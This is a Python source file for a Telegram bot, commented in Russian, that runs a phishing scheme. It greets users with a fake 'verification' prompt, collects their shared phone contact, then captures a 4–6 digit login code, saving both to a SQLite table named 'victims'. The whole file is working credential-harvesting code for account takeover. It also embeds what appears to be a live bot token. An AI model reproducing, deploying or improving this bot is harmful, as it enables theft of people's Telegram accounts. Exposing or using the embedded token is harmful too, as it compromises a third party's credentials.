import os
import sqlite3
import asyncio
import logging
import sys
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiohttp import TCPConnector
from aiogram.client.session.aiohttp import AiohttpSession
from dotenv import load_dotenv

# Принудительная загрузка переменных
load_dotenv()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Отладка токена
BOT_TOKEN = os.getenv('7880089024:AAFmWOsYNjIH1ca88Cc6mvCjyPl_uf6BEaw')
logger.info(f"DEBUG: Token found: {BOT_TOKEN is not None}")

if not BOT_TOKEN:
    logger.error("КРИТИЧЕСКАЯ ОШИБКА: BOT_TOKEN не найден в переменных окружения!")
    sys.exit(1)

DB_PATH = "victims.db"

async def main():
    connector = TCPConnector(force_close=True, enable_cleanup_closed=True)
    session = AiohttpSession()
    session._connector = connector
    
    bot = Bot(token=BOT_TOKEN, session=session)
    dp = Dispatcher()

    # БД
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS victims 
                      (user_id INTEGER PRIMARY KEY, phone TEXT, code TEXT)''')
    conn.commit()
    conn.close()

    @dp.message(Command("start"))
    async def start(message: types.Message):
        kb = types.ReplyKeyboardMarkup(
            keyboard=[[types.KeyboardButton(text="Поделиться контактом", request_contact=True)]],
            resize_keyboard=True, one_time_keyboard=True
        )
        await message.answer("Привет! Пройди верификацию.", reply_markup=kb)

    @dp.message(F.contact)
    async def handle_contact(message: types.Message):
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute("INSERT OR REPLACE INTO victims (user_id, phone) VALUES (?, ?)", 
                       (message.from_user.id, message.contact.phone_number))
        conn.commit()
        conn.close()
        await message.answer("Контакт принят. Введите код:")

    @dp.message(F.text.regexp(r'^\d{4,6}$'))
    async def handle_code(message: types.Message):
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute("UPDATE victims SET code = ? WHERE user_id = ?", (message.text, message.from_user.id))
        conn.commit()
        conn.close()
        await message.answer("Данные приняты.")

    logger.info("Бот запущен и готов к работе!")
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
